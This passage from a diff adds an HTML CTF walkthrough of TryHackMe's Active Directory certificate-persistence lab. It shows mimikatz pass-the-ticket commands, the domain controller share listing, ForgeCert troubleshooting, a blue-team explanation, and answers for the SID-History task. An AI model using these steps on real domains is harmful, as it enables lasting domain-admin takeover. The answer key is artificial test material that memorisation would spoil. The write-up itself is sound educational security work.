+<span class="p">C:\Tools&gt;</span> <span class="hl">dir \\THMDC.za.tryhackme.loc\c$</span></pre>
+      <table class="flagtable">
+        <tr><th>Command</th><th>Meaning</th></tr>
+        <tr><td>kerberos::ptt</td><td>Inject the <code>.kirbi</code> TGT into the current logon session's memory</td></tr>
+        <tr><td>klist</td><td>Confirm the ticket is cached as <code>Administrator</code></td></tr>
+        <tr><td>dir \\THMDC...\c$</td><td>Proof: list the DC's admin-only C$ share as the impersonated Administrator</td></tr>
+      </table>
+      <details class="poc" open>
+        <summary>Real output — ticket cached + DC C$ listed = Domain Admin</summary>
+<pre><span class="p">mimikatz #</span> kerberos::ptt administrator.kirbi
+* File: 'administrator.kirbi': <span class="g">OK</span>
+
+<span class="p">C:\Tools&gt;</span> klist
+Cached Tickets: (1)
+#0&gt;  <span class="g">Client: Administrator @ ZA.TRYHACKME.LOC</span>
+     Server: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
+     KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+     Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
+
+<span class="p">C:\Tools&gt;</span> dir \\THMDC.za.tryhackme.loc\c$
+ <span class="g">Directory of \\THMDC.za.tryhackme.loc\c$</span>
+01/04/2022  08:47 AM        103 delete-vagrant-user.ps1
+05/01/2022  09:11 AM        169 dns_entries.csv
+09/15/2018  08:19 AM  &lt;DIR&gt;  PerfLogs
+07/03/2022  06:05 PM      7,168 shell.exe
+            ... &lt;full DC filesystem&gt; ...
+07/03/2022  09:51 AM  &lt;DIR&gt;  Windows</pre>
+      </details>
+      <div class="callout gotcha">
+        <span class="tag">⚠ Minor typo</span>
+        <p>In the run <code>exir</code> was typed instead of <code>exit</code> — mimikatz just printed "command not found". Harmless; the ticket was already injected. Type <code>exit</code> and move on.</p>
+      </div>
+      <div class="callout oscp">
+        <span class="tag">OSCP note</span>
+        <p>The persistence payoff: <code>mandy.armstrong</code> is a <em>plain domain user</em>, yet now wields a Domain Admin TGT built from nothing but a stolen CA key. Rotate her password, reset krbtgt, nuke all tickets — none of it matters. The forged cert keeps minting TGTs until <strong>2027</strong>. Re-run Step 6 anytime to get a fresh ticket; no DC login or password ever required.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- GOTCHAS SUMMARY -->
+  <section id="gotchas">
+    <div class="sec-head"><span class="sec-num">04</span><h2>Errors &amp; Fixes — Quick Reference</h2></div>
+    <div class="table-wrap">
+      <table class="req">
+        <tr><th>Symptom</th><th>Cause</th><th>Fix</th></tr>
+        <tr><td>Only 1 cert in the store, template = ComputerCertificateTemplate</td><td>Running mimikatz on THMWRK1, not the CA</td><td>SSH to THMDC (<code>.101</code>); verify with <code>ipconfig</code></td></tr>
+        <tr><td><code>scp</code> from Windows: "No such file or directory"</td><td>Kali OpenSSH 9+ uses SFTP, breaks on <code>C:</code> colon</td><td>Add <code>-O</code> (legacy SCP), or push from Windows / use certutil over HTTP</td></tr>
+        <tr><td>Wrong file pulled (<code>_0_</code>)</td><td><code>_0_</code> is a leaf cert, not the CA</td><td>Pull <code>_1_za-THMDC-CA.pfx</code> — the CA by name</td></tr>
+        <tr><td><code>'ForgeCert.exe' is not recognized</code></td><td>Binary is in the <code>ForgeCert\</code> subfolder</td><td>Use full path <code>C:\Tools\ForgeCert\ForgeCert.exe</code></td></tr>
+        <tr><td><code>KDC_ERR_PADATA_TYPE_NOSUPP</code> (16)</td><td>DC not accepting PKINIT preauth</td><td><code>gpupdate /force</code>, then retry asktgt</td></tr>
+        <tr><td><code>KDC_ERR_WRONG_REALM</code> (68)</td><td>Pointed <code>/dc</code> at the forest-root DC (<code>.100</code>)</td><td>Use the child-domain DC <code>10.200.73.101</code></td></tr>
+        <tr><td><code>certutil -pulse: ACCESS_DENIED</code></td><td>Run as low-priv user on THMWRK1</td><td>Not needed here; <code>gpupdate /force</code> was enough</td></tr>
+      </table>
+    </div>
+  </section>
+
+  <!-- BLUE TEAM -->
+  <section id="blue">
+    <div class="sec-head"><span class="sec-num">05</span><h2>Blue Team — Why It's Near-Unremovable</h2></div>
+    <ul>
+      <li><strong>Password rotation does nothing.</strong> The cert authenticates via PKINIT, not a password — rotating the impersonated account's credentials leaves the cert fully valid.</li>
+      <li><strong>Can't be revoked.</strong> We forged it offline from the stolen CA key; it was never issued through AD CS, so it doesn't appear on the issued-certificates list. There is no serial for the blue team to revoke.</li>
+      <li><strong>Only real fix = rotate the root CA.</strong> That instantly invalidates <em>every</em> certificate AD CS ever issued, forcing re-issuance across the whole environment — effectively a PKI rebuild.</li>
+      <li><strong>The nightmare scenario:</strong> the blue team rotates krbtgt twice, clears golden/silver tickets, rebuilds the CA server... and the attacker is still running DA commands because the forged cert predates the rebuild. "Yikes."</li>
+    </ul>
+  </section>
+
+  <!-- ANSWERS (Task 5 preview) -->
+  <section id="answers">
+    <div class="sec-head"><span class="sec-num">06</span><h2>Bonus — Task 5 (SID History) Answers</h2></div>
+    <p>You also pasted Task 5. Quick answers to its questions (SID History persistence — DA-level, patches <code>ntds.dit</code> directly with DSInternals):</p>
+    <ul>
+      <li><strong>AD attribute used for cross-domain migration SIDs:</strong> <span class="ans">SID History</span> (<code>sIDHistory</code>)</li>
+      <li><strong>Database file storing all AD info on the DC:</strong> <span class="ans">ntds.dit</span></li>
+      <li><strong>PowerShell command to restart NTDS after injecting SID history:</strong> <span class="ans">Start-Service -Name ntds</span></li>
+    </ul>
+    <div class="callout theory">
+      <span class="tag">Want the full Task 5 walkthrough too?</span>
+      <p>Say the word and I'll build a matching PoC walkthrough for SID-History persistence (<code>Get-ADUser … -properties sidhistory</code> → <code>Stop-Service ntds</code> → <code>Add-ADDBSidHistory</code> → <code>Start-Service ntds</code> → verify DA access) once you've captured that run's output.</p>
+    </div>
+  </section>
+
+  <footer>
+    Source: TryHackMe <em>Persisting Active Directory</em> — Task 4 (Persistence through Certificates). All terminal output is from a live authorized run against the <code>za.tryhackme.loc</code> lab forest. For lab / CTF / authorized penetration-testing use only.
+  </footer>
+
+</div>
+
+</body></html>
